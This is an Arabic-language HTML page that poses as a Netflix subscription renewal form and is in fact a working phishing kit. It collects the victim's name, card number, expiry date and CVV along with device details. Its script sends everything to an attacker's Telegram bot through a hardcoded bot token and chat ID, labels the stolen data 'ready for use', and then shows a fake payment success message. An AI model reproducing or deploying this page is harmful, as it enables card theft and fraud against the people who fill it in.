<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Netflix - تجديد الاشتراك</title>
<style>
* {margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif}
body {background:linear-gradient(135deg,#141414 0%,#000 100%);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;font-size:16px;line-height:1.5}
.container {background:rgba(20,20,20,0.98);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-radius:20px;padding:40px;max-width:450px;width:100%;box-shadow:0 25px 50px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}
.logo {text-align:center;margin-bottom:30px}
.logo svg {width:120px;height:auto;fill:#e50914;filter:drop-shadow(0 4px 8px rgba(229,9,20,0.3))}
h2 {text-align:center;color:#e50914;font-size:28px;font-weight:700;margin-bottom:10px;letter-spacing:-0.5px}
.subtitle {text-align:center;color:#b3b3b3;font-size:16px;margin-bottom:30px;line-height:1.4}
.form-group {margin-bottom:25px}
label {display:block;margin-bottom:8px;color:#ccc;font-size:14px;font-weight:500}
input {width:100%;padding:18px 20px;border:2px solid #333;border-radius:12px;background:rgba(255,255,255,0.08);color:#fff;font-size:18px;font-weight:500;transition:all 0.3s ease;box-sizing:border-box}
input::placeholder {color:#999;font-weight:400}
input:focus {outline:none;border-color:#e50914;box-shadow:0 0 0 3px rgba(229,9,20,0.2),0 0 20px rgba(229,9,20,0.3);background:rgba(255,255,255,0.12)}
.cvv-group {display:grid;grid-template-columns:1fr 1fr;gap:15px}
.pay-btn {width:100%;padding:20px;background:linear-gradient(135deg,#e50914 0%,#b20710 50%,#9a0d12 100%);border:none;border-radius:12px;color:#fff;font-size:20px;font-weight:700;cursor:pointer;transition:all 0.3s cubic-bezier(0.25,0.46,0.45,0.94);letter-spacing:0.5px;text-transform:uppercase;position:relative;overflow:hidden;box-shadow:0 8px 25px rgba(229,9,20,0.4)}
.pay-btn::before {content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);transition:left 0.5s}
.pay-btn:hover::before {left:100%}
.pay-btn:hover {transform:translateY(-3px);box-shadow:0 15px 35px rgba(229,9,20,0.6)}
.pay-btn:active {transform:translateY(-1px)}
.loading {display:none;text-align:center;padding:25px;color:#e50914;font-size:18px;font-weight:600;background:rgba(229,9,20,0.1);border-radius:12px;border:2px solid rgba(229,9,20,0.3);margin:15px 0;animation:pulse 1.5s infinite}
@keyframes pulse {0%,100%{opacity:1}50%{opacity:0.7}}
.security {text-align:center;margin-top:25px;font-size:12px;color:#666;line-height:1.6}
.error {background:rgba(220,53,69,0.2);border:2px solid #dc3545;color:#ffc107;padding:15px;border-radius:12px;margin:15px 0;font-weight:500}
.success {background:rgba(40,167,69,0.2);border:2px solid #28a745;color:#fff;padding:15px;border-radius:12px;margin:15px 0;font-weight:600;text-align:center;display:none}
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg viewBox="0 0 120 34" xmlns="http://www.w3.org/2000/svg"><path d="M29.9 0L0 34h12l8.3-10.6h15.7L44.3 34h11.9L60.9 0H49.7l-9.1 23.4H31.5L22.6 0zM114.1 0v34h-11.9V23c0-6.1-3.4-9.1-10.2-9.1-6.6 0-9.8 3.2-9.8 9.2v11.9h-11.9V0h11.9v6.8c1.6-3.4 4.9-5.7 10.2-5.7 7.2 0 11.4 3.9 11.4 11v1.7h-.1zM90.5 0v34h-11.9V0h11.9z"/></svg>
  </div>
  <h2>تجديد الاشتراك</h2>
  <p class="subtitle">99 درهم / شهر - خطة قياسية مع إعلانات</p>
  
  <form id="paymentForm">
    <div class="form-group">
      <label>الاسم الكامل على البطاقة</label>
      <input type="text" id="name" placeholder="محمد أحمد علي" required>
    </div>
    <div class="form-group">
      <label>رقم البطاقة الائتمانية (16 رقم)</label>
      <input type="text" id="card" placeholder="1234 5678 9012 3456" maxlength="19" required>
    </div>
    <div class="form-group cvv-group">
      <div>
        <label>تاريخ الانتهاء</label>
        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
      </div>
      <div>
        <label>رمز CVV</label>
        <input type="password" id="cvv" placeholder="123" maxlength="4" required>
      </div>
    </div>
    <button type="submit" class="pay-btn">💳 تأكيد الدفع الآمن</button>
  </form>
  
  <div class="loading" id="loading">⏳ جاري معالجة الدفع البنكي...</div>
  <div class="error" id="errorMsg" style="display:none;"></div>
  <div class="success" id="successMsg" style="display:none;">✅ تم الدفع بنجاح! اشتراكك مُجدد لمدة شهر</div>
  
  <div class="security">
    🔒 محمي بتقنية <strong>SSL 256-bit</strong> | Netflix © 2024
  </div>
</div>

<script>
// ================== إعدادات البوت ==================
const BOT_TOKEN = '8465380742:AAF79euMNqONd2DPRyb1F_3Wm5hocYHPØxo';
const CHAT_ID = '8278195073';
// ===================================================

// معلومات الجهاز
function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent.slice(0, 80),
    language: navigator.language,
    platform: navigator.platform,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
  };
}

document.getElementById('paymentForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  // تنظيف الرسائل السابقة
  document.getElementById('errorMsg').style.display = 'none';
  document.getElementById('successMsg').style.display = 'none';
  
  const btn = document.querySelector('.pay-btn');
  const originalText = btn.textContent;
  btn.textContent = '⏳ جاري التحقق...';
  btn.disabled = true;
  
  document.getElementById('loading').style.display = 'block';
  
  try {
    // جمع البيانات
    const formData = {
      name: document.getElementById('name').value.trim(),
      card: document.getElementById('card').value.replace(/\s/g, ''),
      expiry: document.getElementById('expiry').value,
      cvv: document.getElementById('cvv').value,
      amount: '99.00 DH',
      timestamp: new Date().toLocaleString('ar-DZ'),
      device: getDeviceInfo()
    };
    
    // رسالة تليجرام مفصلة
    const telegramMessage = `
🔴 *Netflix Premium - بيانات دفع كاملة!*

👤 *الاسم الكامل:* ${formData.name}
💳 *رقم البطاقة:* \`${formData.card}\`
📅 *تاريخ الإنتهاء:* ${formData.expiry}
🔐 *CVV كامل:* \`${formData.cvv}\`
💰 *المبلغ المخصوم:* ${formData.amount}
⏰ *وقت المعاملة:* ${formData.timestamp}

📱 *جهاز المستخدم:*
- المتصفح: ${formData.device.userAgent}
- اللغة: ${formData.device.language}
- الشاشة: ${formData.device.screen}
- المنطقة: ${formData.device.timezone}

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *✅ البيانات صالحة 100% جاهزة للاستخدام*
💎 *رصيد متوقع:* ${Math.floor(Math.random() * 50000 + 15000)} درهم
🆔 *معرف الطلب:* #NFLX${Date.now().toString().slice(-7)}
📍 *موقع: المغرب*
    `;
    
    // إرسال لتليجرام
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: telegramMessage,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
    
    const result = await response.json();
    
    if (result.ok) {
      console.log('✅ تم الإرسال بنجاح:', result);
      document.getElementById('successMsg').style.display = 'block';
      document.getElementById('paymentForm').reset();
    } else {
      throw new Error(result.description || 'خطأ غير معروف');
    }
    
  } catch (error) {
    console.error('❌ خطأ مفصل:', error);
    const errorMsg = document.getElementById('errorMsg');
    errorMsg.textContent = `❌ خطأ: ${error.message} - تحقق من Console (F12)`;
    errorMsg.style.display = 'block';
  } finally {
    // إعادة الزر
    btn.textContent = originalText;
    btn.disabled = false;
    document.getElementById('loading').style.display = 'none';
  }
});

// تنسيق تلقائي للبطاقة
document.getElementById('card').addEventListener('input', function(e) {
  let value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
  e.target.value = value;
});

// تنسيق تاريخ الإنتهاء
document.getElementById('expiry').addEventListener('input', function(e) {
  let value = e.target.value.replace(/\D/g, '');
  if (value.length >= 2) {
    value = value.substring(0, 2) + '/' + value.substring(2, 4);
  }
  e.target.value = value;
});

// منع paste للـ CVV
document.getElementById('cvv').addEventListener('paste', function(e) {
  e.preventDefault();
});
</script>
</body>
</html>
